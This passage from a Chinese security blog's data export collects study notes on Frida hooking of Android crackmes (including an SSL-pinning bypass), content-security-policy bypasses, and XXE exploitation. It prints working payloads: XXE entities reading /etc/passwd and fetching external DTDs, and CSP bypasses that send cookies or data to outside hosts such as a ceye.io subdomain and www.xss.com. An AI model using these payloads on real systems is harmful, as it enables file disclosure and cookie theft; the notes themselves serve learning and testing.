&gt;]&gt;\\n&quot; + &quot; \\n&quot; + &quot;&lt;root&gt;&amp;test;&lt;/root&gt; &quot;); Map&lt;String, String&gt; map = result.toMap(); System.out.println(map); //Assert.assertEquals(map.get(&quot;return_code&quot;), &quot;SUCCESS&quot;); //Assert.assertEquals(map.get(&quot;attach&quot;), &quot;订单额外描述&quot;); &#125; 进行函数跟踪tomap到 BaseWxPayResult.java12345678910111213141516171819202122public Map&lt;String, String&gt; toMap() &#123; if (StringUtils.isBlank(this.xmlString)) &#123; throw new RuntimeException(&quot;xml数据有问题，请核实！&quot;); &#125; Map&lt;String, String&gt; result = Maps.newHashMap(); Document doc = this.getXmlDoc(); try &#123; NodeList list = (NodeList) XPathFactory.newInstance().newXPath() .compile(&quot;/xml/*&quot;) .evaluate(doc, XPathConstants.NODESET); int len = list.getLength(); for (int i = 0; i &lt; len; i++) &#123; result.put(list.item(i).getNodeName(), list.item(i).getTextContent()); &#125; &#125; catch (XPathExpressionException e) &#123; throw new RuntimeException(&quot;非法的xml文本内容：&quot; + xmlString); &#125; return result; &#125; 追溯到 getXmlDoc 可以在ceye上看到原漏洞导致的结果 修复措施修改配置1documentBuilderFactory.setExpandEntityReferences(false); 查看下详情123public void setExpandEntityReferences(boolean expandEntityRef) &#123; this.expandEntityRef = expandEntityRef; &#125; 这个初始化设置为true1private boolean expandEntityRef = true; 但是这样修复的后果就是没有什么用，导致了CVE-2019-5312的问题实际中可以参照ex1中的修复 漏洞复现 CVE-2019-5312ex3 –待补充 实际渗透测试生活中遇到的xxe漏洞 漏洞原理漏洞复现 参考12345https://xz.aliyun.com/t/2427https://mp.weixin.qq.com/s/xV7vtJmFL0FkPX05kiLNVwhttps://github.com/Wechat-Group/WxJava/issues/889https://github.com/Wechat-Group/WxJava/issues/903https://blog.csdn.net/u013224189/article/details/80902339","categories":[],"tags":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"XXE 实例利用","slug":"XXE-实例利用","permalink":"http://yoursite.com/tags/XXE-实例利用/"}]},{"title":"frida理解与学习","slug":"移动端/frida1","date":"2019-01-22T09:42:23.000Z","updated":"2019-07-21T04:44:08.215Z","comments":true,"path":"2019/01/22/移动端/frida1/","link":"","permalink":"http://yoursite.com/2019/01/22/移动端/frida1/","excerpt":"","text":"【1】pip install frida 【2】sudo pip install frida-tools 【3】我这里使用的测试机cpuinfo是1Processor : ARMv7 Processor rev 0 (v7l) 所以下载的对应的server版本是frida-server-12.2.29-android-arm 在启动对应的sever后，可以不用端口转发直接测试链接 frida-ps -U：在另一个终端的常规操作系统shell中检测frida中进程 frida-trace : 跟踪由对应应用使用的特定调用 如 跟踪chrome使用的open应用1frida-trace -i &quot;open&quot; -U com.android.chrome 内心os（不知道特么是什么玄学问题，直接用的现目前最新版29，死活有问题，都快怀疑人生了，换了下24低版本，可以正常使用） 测试功能python 枚举android手机所有的进程12345import fridardev = frida.get_remote_device()processes = rdev.enumerate_processes()for process in processes: print (process) js 测试12345setTimeout(function()&#123; Java.perform(function()&#123; console.log(&quot;hello world!&quot;); &#125;);&#125;); frida ssl unpinning(待细看)1234567891011Java.perform(function() &#123; var array_list = Java.use(&quot;java.util.ArrayList&quot;); var ApiClient = Java.use(&apos;com.android.org.conscrypt.TrustManagerImpl&apos;); // console.log(&apos;Start ssl bypass.&apos;); ApiClient.checkTrustedRecursive.implementation = function(a1,a2,a3,a4,a5,a6) &#123; console.log(&apos;Bypassing SSL Pinning&apos;); var k = array_list.$new(); return k; &#125;&#125;,0); 在进行后面初学测试后，回头看 才发现这个并不是之前以为的通用版，是hook了com.android.org.conscrypt.TrustManagerImpl类的checkTrustedRecursive函数，猜测是作者在对应应用的校验函数。 初学功能模块访问进程内存read_bytes(address, n) write_bytes(address, data) 案例 利用Frida从TeamViewer内存中提取密码（暂未复现） 在应用程序运行时覆盖函数implementation 覆盖了原函数，进行重执行 从导入的类调用函数这个也是默认的功能，可以直接调用java.use的导入需求的类，然后通过 this.a 调用原函数，调用情况在下面例子中有。 当需要打印成员数据时，可以调用.value属性来访问123var ah = Java.use(&quot;com/miui/virtualsim/utils/ah&quot;);console.log(&quot;To Log: &quot; + ah.a.value);ah.a.value = true; 在堆上查找对象实例并使用他们Hook、追踪和拦截函数123https://blog.csdn.net/u011337769/article/details/82855818https://www.52pojie.cn/thread-848126-1-1.htmlhttps://blog.csdn.net/qingemengyue/article/details/79871926 crack 学习ex1因为不知道的什么原因，我这里的frida在使用-f（spawn）的时候就会报错，not connection，所以不能spwan模式在重启程序时调试。只能着眼于已进入mainActivity程序后续进行hook 如何修改Java层的函数参数和返回值 apk解析 首先找mainActivity中的oncreate方法，这个是在activity创建时即执行的方法 mainActivity12345678910111213141516171819202122232425262728293031323334353637383940414243444546package sg.vantagepoint.uncrackable1;import android.app.Activity;import android.app.AlertDialog;import android.app.AlertDialog.Builder;import android.os.Bundle;import android.view.View;import android.widget.EditText;import sg.vantagepoint.a.b;import sg.vantagepoint.a.c;public class MainActivity extends Activity &#123; private void a(String str) &#123; AlertDialog create = new Builder(this).create(); create.setTitle(str); create.setMessage(&quot;This in unacceptable. The app is now going to exit.&quot;); create.setButton(-3, &quot;OK&quot;, new b(this)); create.setCancelable(false); create.show(); &#125; protected void onCreate(Bundle bundle) &#123; if (c.a() || c.b() || c.c()) &#123; a(&quot;Root detected!&quot;); &#125; if (b.a(getApplicationContext())) &#123; a(&quot;App is debuggable!&quot;); &#125; super.onCreate(bundle); setContentView(R.layout.activity_main); &#125; public void verify(View view) &#123; String obj = ((EditText) findViewById(R.id.edit_text)).getText().toString(); AlertDialog create = new Builder(this).create(); if (a.a(obj)) &#123; create.setTitle(&quot;Success!&quot;); create.setMessage(&quot;This is the correct secret.&quot;); &#125; else &#123; create.setTitle(&quot;Nope...&quot;); create.setMessage(&quot;That&apos;s not it. Try again.&quot;); &#125; create.setButton(-3, &quot;OK&quot;, new c(this)); create.show(); &#125;&#125; 在该apk调用中，在mainAc中onCreate- create.setButton(-3, “OK”, new b(this)); b类12345678910111213141516package sg.vantagepoint.uncrackable1;import android.content.DialogInterface;import android.content.DialogInterface.OnClickListener;class b implements OnClickListener &#123; final /* synthetic */ MainActivity a; b(MainActivity mainActivity) &#123; this.a = mainActivity; &#125; public void onClick(DialogInterface dialogInterface, int i) &#123; System.exit(0); &#125;&#125; 调用后退出应用。 注入js解析12345678910111213setImmediate(function() &#123; //prevent timeout console.log(&quot;[*] Starting script&quot;); Java.perform(function() &#123; bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); bClass.onClick.implementation = function(v) &#123; console.log(&quot;[*] onClick called&quot;); &#125; console.log(&quot;[*] onClick handler modified&quot;) &#125;)&#125;) 在该js中 Java.perform相当于main函数；获取sg.vantagepoint.uncrackable1.b 类，然后调用onclick模拟点击事件,让本该退出的成为 调用后输出console.log修改： 1234567891011121314151617setImmediate(function() &#123; //prevent timeout console.log(&quot;[*] Starting script&quot;); Java.perform(function() &#123; bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); aClass = Java.use(&quot;sg.vantagepoint.uncrackable1.c&quot;); bClass.onClick.implementation = function(v) &#123; console.log(&quot;[*] onClick called bb&quot;); &#125; aClass.onClick.implementation = function(v) &#123; console.log(&quot;[*] onClick called aa&quot;); &#125; console.log(&quot;[*] onClick handler modified&quot;) &#125;)&#125;) 在该apk中，调用原aes加密函数 sg.vantagepoint.a.a函数，进行解密，将结果输出。 12345678910111213141516171819202122setImmediate(function() &#123; //prevent timeout console.log(&quot;[*] Starting script&quot;); Java.perform(function() &#123; bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); bClass.onClick.implementation = function(v) &#123; console.log(&quot;[*] onClick called&quot;); &#125; aaclass = Java.use(&quot;sg.vantagepoint.a.a&quot;); aaclass.a.implementation = function (arg1, arg2) &#123; pass = &quot;&quot;; s = this.a(arg1, arg2); for(i=0; i&lt;s.length; i++) &#123; pass += String.fromCharCode(s[i]); &#125; console.log(&quot;[*] content: &quot; + pass);return s;&#125; console.log(&quot;[*] onClick handler modified&quot;) &#125;)&#125;) 在该apk中，hook输出最后的校验函数 sg.vantagepoint.uncrackable1.a.a函数结果，使其一直返回true 123456789101112131415161718setImmediate(function() &#123; //prevent timeout console.log(&quot;[*] Starting script&quot;); Java.perform(function() &#123; bClass = Java.use(&quot;sg.vantagepoint.uncrackable1.b&quot;); bClass.onClick.implementation = function(v) &#123; console.log(&quot;[*] onClick called&quot;); &#125; aaclass = Java.use(&quot;sg.vantagepoint.uncrackable1.a&quot;); aaclass.a.implementation = function (arg1) &#123; return true; &#125; console.log(&quot;[*] onClick handler modified&quot;) &#125;)&#125;) ex2场景参考在这里：https://bbs.pediy.com/thread-227232.htm 源码分析同上先看oncreate函数1234567891011protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); this.P = (Button) findViewById(R.id.button); this.S = (Button) findViewById(R.id.button3); this.r = (Button) findViewById(R.id.buttonR); this.P.setOnClickListener(this); this.r.setOnClickListener(this); this.S.setOnClickListener(this); this.flag = 0; &#125; 菜鸟学android什么都的查emmmmm Bundle savedInstanceState：经常会出现用户按到home键，退出了界面，或者安卓系统意外回收了应用的进程，这种情况下，使用Bundle savedInstanceState就可以用户再次打开应用的时候恢复的原来的状态，剩下的声明了button控件和事件的监听 onClick函数123456789101112131415161718192021222324public void onClick(View v) &#123; if (this.flag != 1) &#123; this.flag = 1; ((TextView) findViewById(R.id.textView3)).setText(&quot;&quot;); TextView tv = (TextView) findViewById(R.id.textView); TextView tv2 = (TextView) findViewById(R.id.textView2); this.m = 0; this.n = new Random().nextInt(3); tv2.setText(new String[]&#123;&quot;CPU: Paper&quot;, &quot;CPU: Rock&quot;, &quot;CPU: Scissors&quot;&#125;[this.n]); if (v == this.P) &#123; tv.setText(&quot;YOU: Paper&quot;); this.m = 0; &#125; if (v == this.r) &#123; tv.setText(&quot;YOU: Rock&quot;); this.m = 1; &#125; if (v == this.S) &#123; tv.setText(&quot;YOU: Scissors&quot;); this.m = 2; &#125; this.handler.postDelayed(this.showMessageTask, 1000); &#125; &#125; postDelayed：创建多线程消息的函数，类似于定时器，每秒触发一下this.showMessageTask123456789101112131415161718192021222324252627private final Runnable showMessageTask = new Runnable() &#123; public void run() &#123; TextView tv3 = (TextView) MainActivity.this.findViewById(R.id.textView3); MainActivity mainActivity; if (MainActivity.this.n - MainActivity.this.m == 1) &#123; mainActivity = MainActivity.this; mainActivity.cnt++; tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt)); &#125; else if (MainActivity.this.m - MainActivity.this.n == 1) &#123; MainActivity.this.cnt = 0; tv3.setText(&quot;LOSE +0&quot;); &#125; else if (MainActivity.this.m == MainActivity.this.n) &#123; tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt)); &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123; MainActivity.this.cnt = 0; tv3.setText(&quot;LOSE +0&quot;); &#125; else &#123; mainActivity = MainActivity.this; mainActivity.cnt++; tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt)); &#125; if (1000 == MainActivity.this.cnt) &#123; tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;); &#125; MainActivity.this.flag = 0; &#125; &#125;; 根据例子一以及源码分析，该问题需要hook com.example.seccon2015.rock_paper.scissors.MainActivity中的showMessageTask函数,使其直接执行 123if (1000 == MainActivity.this.cnt) &#123; tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;); &#125; 构造js如下，hook掉对应的onclick函数-1：123456789101112setImmediate(function() &#123; //prevent timeout console.log(&quot;[*] Starting script&quot;); Java.perform(function () &#123; var mClass = Java.use(&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;); mClass.onClick.implementation = function () &#123; console.log(&quot;Hook Start...&quot;); console.log(&quot;SECCON&#123;&quot; + (1000 + this.calc())*107 + &quot;&#125;&quot;) &#125; &#125;)&#125;); 构造js如下，hook掉对应的onclick函数-2： 1234567891011121314151617setImmediate(function() &#123; //prevent timeout console.log(&quot;[*] Starting script&quot;); Java.perform(function () &#123;//定义变量MainActivity，Java.use指定要使用的类 var MainActivity = Java.use(&apos;com.example.seccon2015.rock_paper_scissors.MainActivity&apos;); //hook该类下的onCreate方法，重新实现它 MainActivity.onClick.implementation = function () &#123; send(&quot;Hook Start...&quot;); //调用calc()方法，获取返回值 var returnValue = this.calc(); send(&quot;Return:&quot;+returnValue); var result = (1000+returnValue)*107; //解出答案 send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;); &#125; &#125;)&#125;); 如何打印Java层的方法堆栈信息枚举内存范围 enumerate_ranges(mask) 如何拦截native层的函数参数和返回值需要理解的问题java反射动态代码插桩DBI参考1234567https://www.52pojie.cn/thread-848126-1-1.htmlhttps://blog.csdn.net/omnispace/article/details/70598829https://codemetrix.net/hacking-android-apps-with-frida-2/https://www.frida.re/docs/javascript-api/#javahttps://github.com/iromise/AOS-Note/blob/42544f4635e6238e2d7ddbc6e4e1789c20d2c130/frida-exp/frida.mdhttps://bbs.pediy.com/thread-227232.htmhttps://www.cnblogs.com/qwangxiao/p/9255328.html","categories":[],"tags":[{"name":"移动端","slug":"移动端","permalink":"http://yoursite.com/tags/移动端/"},{"name":"frida","slug":"frida","permalink":"http://yoursite.com/tags/frida/"}]},{"title":"安全策略-csp理解与学习","slug":"安全策略/csp","date":"2019-01-09T18:11:33.000Z","updated":"2019-07-21T04:44:08.691Z","comments":true,"path":"2019/01/10/安全策略/csp/","link":"","permalink":"http://yoursite.com/2019/01/10/安全策略/csp/","excerpt":"","text":"内容安全策略 CSP百度百科概念： CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容 直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成 功能效果主要用来防注入脚本（比如 xss 加载其他域下的js；广告注入h5页面、运营商的http劫持）图片、iframe、fton、style等等可能的远程的资源 限制远程资源的请求，如通过远程请求将资源如cookie传送出去 记录违规的限制行为，并汇报给指定目标。 CSP和同源策略在同源策略中 一个页面的资源只能从与之同源的服务器获取，不能从其他域获取；但因此也影响了灵活性，CSP相对来说 可以跨域获取资源，又能防止恶意代码。 使用方式：要素CSP域：允许使用CSP的规则 CSP指令集：允许白名单的内容规则1234567891011121314151617181920212223示例default-src &apos;self&apos;; 只允许同源下的资源 script-src &apos;self&apos;; 只允许同源下的js script-src &apos;self&apos; www.google-analytics.com ajax.googleapis.com;允许同源以及两个地址下的js加载 default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;多个资源时,后面的会覆盖前面的 常见csp策略 指令 指令和指令值示例 指令说明 default-src ‘self’ cdn.guangzhul.com 默认加载策略 script-src ‘self’ js.guangzhul.com 对 JavaScript 的加载策略。 style-src ‘self’ css.guangzhul.com 对样式的加载策略。 img-src ‘self’ img.guangzhul.com 对图片的加载策略。 connect-src ‘self’ 对 Ajax、WebSocket 等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为 400 的响应。 font-src font.cdn.guangzhul.com 针对 WebFont 的加载策略。 object-src ‘self’ 针对 、 或 等标签引入的 flash 等插件的加载策略。 media-src media.cdn.guangzhul.com 针对媒体引入的 HTML 多媒体的加载策略。 frame-src ‘self’ 针对 frame 的加载策略。 report-uri /report-uri 告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。 特别的：如果想让浏览器只汇报日志，不阻止任何内容，可以改用 Content-Security-Policy-Report-Only 头。 其他CSP指令 指令 指令和指令值示例 指令说明 sandbox 设置沙盒环境 child-src 主要防御 , form-action 主要防御 frame-ancestors 主要防御 ,,,, plugin-types 主要防御 ,, 常见指令值 指令值 指令和指令值示例 指令值说明 * img-src * 允许任何内容。 ‘none’ img-src ‘none’ 不允许任何内容。 ‘self’ img-src ‘self’ 允许来自相同来源的内容（相同的协议、域名和端口）。 data: img-src data: 允许 data: 协议（如 base64 编码的图片）。 www.guangzhul.com img-src img.guangzhul.com 允许加载指定域名的资源。 *.guangzhul.com img-src *.guangzhul.com 允许加载 guangzhul.com 任何子域的资源。 ‘unsafe-inline’ script-src ‘unsafe-inline’ 允许加载 inline 资源（例如常见的 style 属性，onclick，inline js 和 inline css 等等）。 ‘unsafe-eval’ script-src ‘unsafe-eval’ 允许加载动态 js 代码，例如 eval()。 12限制所有的外部资源，都只能从当前域名加载Content-Security-Policy: default-src &apos;self&apos; 可以由http header和html来指定,启用后，不符合 CSP 的外部资源就会被阻止加载。 http header在服务端的响应包的header中展示 内容均来自于应用自己域，不涉及子域1Content-Security-Policy:default-src&apos;self&apos; html中通过meta来限制1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; 构建一下csp 来个例子配置首先要在配置文件中加载mod_headers.so模块，1sudo a2enmod headers 在对应的配置文件中，我用的apache2.conf进行配置 1LoadModule headers_module modules/mod_headers.so 然后可以添加相关规则1Header set Content-Security-Policy &quot;default-src &apos;self&apos;;&quot; 常见绕过方式1 文件上传绕过 只允许加载当前域最常见规则如下：1header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;); 针对这种方式，通常使用方法是 找一个文件上传点，上传一个文件内容为js的图片说到这里 注意一下，浏览器对一个文件做解析/下载 处理的,并不是文件的后缀名而是服务器返回的mimeType,如果在服务端没有定义的类型，即通俗的mimes.type中没有定义，即没有返回content-type则在apache服务器中会默认以html格式解析（在nginx服务器中会以octet-stream，直接下载，这里可以使用svg后缀触发svg标签。条件允许的话），所以在遇到上传黑名单的时候，可以试试xx类似的。 测试过程中 一来就折戟沉沙，头大，使用 该规则后，简单测试 xx文件后缀，直接嵌入script标签，1&lt;script&gt;alert(1)&lt;/script&gt; 竟然没用，一顿瞎操作后才确定，是因为制定了csp规则的问题。1script-src &apos;self&apos;; 或者 default-src &apos;self&apos; 要允许内联的js执行，即添加 “unsafe-inline” 不允许内联时 测试的时候直接alert是没法触发的，所以在常规渗透测试的时候要注意，这个时候用 script src 这类引用是可以的，引用上传的同域js 执行。 使用下列js伪协议的payload可以绕过safari（ 12.0.2 ）的csp检测，chrome和firefox不行，猜测可能跟csp检测顺序阶段有关（待深入讨论）。123456789&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==&quot; &gt;test&lt;/a&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;Bypass CSP by @akita_zenWorks for CSP like script-src self 允许内联时 可以正常输入输出测试 2、预加载 标签rel属性 绕过只允许加载当前域谈到这个问题就不得不说一下浏览器的预加载/预读取 2.1 预加载 预加载：目的和js压缩、cdn等类似都是优化浏览器请求时加快请求速度，让浏览器在空闲时间下载或读取资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。（来自MDN的解释） 2.1.1 预加载例子 【1】prefetch 预加载资源-旧版chrome可用 实现方法： 通过link实现，将rel属性指定为“prefetch”，在href中指定加载资源的地址。 123456&lt;!-- 预加载整个页面 --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.webhek.com/misc/3d-album/&quot; /&gt;&lt;!-- 预加载一个图片 --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot; http://www.webhek.com/wordpress/wp-content/uploads/2014/04/b-334x193.jpg &quot; /&gt; 【2】prerender chrome预渲染-可用 对对应地址所有资源进行渲染1&lt;link rel=&quot;prerender&quot; href=&quot;http://linux.im&quot;&gt; 【3】dns-prefetch DNS预解析-可用 故名思意，DNS预解析 提前将分析页面所需资源域名进行ip转换，使之在请求时尽快完成DNS解析。1&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://linux.im&quot;&gt; 【4】除此之外还有Preconnect(-可用 类似于dns-prefetch，同时会完成握手机制)、subresource、preload这里接触不多，就不一一多提了。 2.1.2 预加载的绕过 回到我们的重点，预加载针对的CSP绕过规则在限制了资源请求时，在xss中想要把cookie传送出去 限制如下：1header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;); 限制了不可信资源的请求，且不允许内联执行这个时候就可以用预加载方式进行绕过 传出需要的数据如： 【1】 dns-prefetch1&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt; 这个时候就可以在ceye上查看相关dns请求记录 【2】prefetch在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）1&lt;link rel=&quot;prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt; 【3】Preconnect、prerender 均测可用，其他的暂未测试。 以下也尚未测试 尴尬 仅摘抄，先写到这吧 3 url跳转在规则限制为 default-src ‘none’的情况下，此时策略为 默认策略 禁止所有资源（不允许加载所有内容） 可以使用meta标签实现跳转1&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt; 在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。123&lt;script&gt; window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;&lt;/script&gt; 4 利用浏览器补全有些网站限制只有某些脚本才能使用，往往会使用标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：1Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-abc&apos; 那么当脚本插入点为如下的情况时 12&lt;p&gt;插入点&lt;/p&gt;&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt; 可以插入12345&lt;script src=//14.rs a=&quot;这样会拼成一个新的script标签，其中的src可以自由设定&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt; 5 代码重用Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库。例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP： 在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie iframe1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP： 2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。 meta标签meta标签有一些不常用的功能有时候有奇效：meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。1234&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;meta可以设置Cookie（Firefox下），可以结合self-xss利用。&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt; 默认特性 阻止内联代码的执行 eval 相关功能被禁用 防护问题：参考：123456http://www.ruanyifeng.com/blog/2016/09/csp.htmlhttps://blog.csdn.net/qq_37943295/article/details/79978761https://paper.seebug.org/423/https://xz.aliyun.com/t/318https://paper.seebug.org/91/http://www.webhek.com/post/link-prefetch.html 存疑【1】内联js的定义 属于内联还是外联（通俗的来说 内联 即属于script标签内直接调用，外联属于调用外部js）","categories":[{"name":"浏览器安全策略","slug":"浏览器安全策略","permalink":"http://yoursite.com/categories/浏览器安全策略/"},{"name":"csp","slug":"浏览器安全策略/csp","permalink":"http://yoursite.com/categories/浏览器安全策略/csp/"}],"tags":[{"name":"浏览器安全策略","slug":"浏览器安全策略","permalink":"http://yoursite.com/tags/浏览器安全策略/"}]},{"title":"2019","slug":"2019","date":"2019-01-01T09:42:23.000Z","updated":"2019-07-21T04:44:07.561Z","comments":true,"path":"2019/01/01/2019/","link":"","permalink":"http://yoursite.com/2019/01/01/2019/","excerpt":"","text":"随着2018的过去，生活不知不觉的过去的一年，这一年里感觉多多少少还是需要说点啥，先总的一说，总体还是比较满意的，顺利的毕业、顺利的工作，但近段时间以来，感觉个人浮躁了很多，可能是根本就没让自己沉淀下来吧，新的一年，还是给自己树立一个小的flag吧。 重新规划技术成长的节奏 团队技术性成长 回归生活 先学会吉他 开始练字静心","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/生活/"},{"name":"规划","slug":"规划","permalink":"http://yoursite.com/tags/规划/"}]},{"title":"XXE 示例及利用","slug":"Web渗透/XXE/XXE示例及应用","date":"2018-12-24T14:21:04.000Z","updated":"2019-07-21T04:44:07.932Z","comments":true,"path":"2018/12/24/Web渗透/XXE/XXE示例及应用/","link":"","permalink":"http://yoursite.com/2018/12/24/Web渗透/XXE/XXE示例及应用/","excerpt":"","text":"[TOC] 注：libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用 简析XXEphp漏洞示例：1234&lt;?php$data = file_get_contents(&apos;php://input&apos;);$xml = simplexml_load_string($data);echo $xml-&gt;name; 其中发送请求的请求头：当前客户端可以接收的文档类型。1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 payload1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;a&gt; &lt;name&gt;&amp;passwd;&lt;/name&gt; 标签可以自定义，但由于echo$xml-&gt;name，然后echo 只能处理字符串，对其他变量不能处理，因此此处用print_r 效果更好 &lt;/a&gt; 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 直接通过外部实体DTD声明 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 通过外部实体引入外部DTD文档，再引入外部实体声明[没有验证成功，更换引用本地dtd也只能读取，解析出错]这种命名实体调用外部实体，发现xxe.dtd中不能定义/声明实体，否则解析不了。 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ENTITY a SYSTEM &quot;http://127.0.0.1:8888/test/xxe.dtd&quot; &gt;]&gt;&lt;name&gt;&amp;b;&lt;/name&gt; 通过外部参数实体引入外部实体声明 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:8888/test/xxe.dtd&quot; &gt;%xxe;]&gt;&lt;name&gt;&amp;b;&lt;/name&gt; XXE攻击面的拓展XXE漏洞检测流程有回显测试 测试是否解析xml： 1234567&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE ANY [&lt;!ENTITY test &quot;test&quot;&gt;]&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 测试是否支持外部实体用外部参数/普通实体测试一下 (system) 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 无回显测试无防火墙的情况下，可以尝试ssrf1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://xx.xx.xx.xx/&quot;&gt;%remote;]&gt; 面对有回显和无回显部分有回显比较简单暂不考虑 无回显：Blind XXE 构建带外信道 无回显任意文件读取php://filter/read=convert.base64-encode/resource=./target.php 获取目标内容然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx 理论上来说 此处使用的逻辑：通过嵌套形式的使用建立带外数据通道 直接在内部实体声明中引用另一个实体如下：1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY % param1 SYSTEM 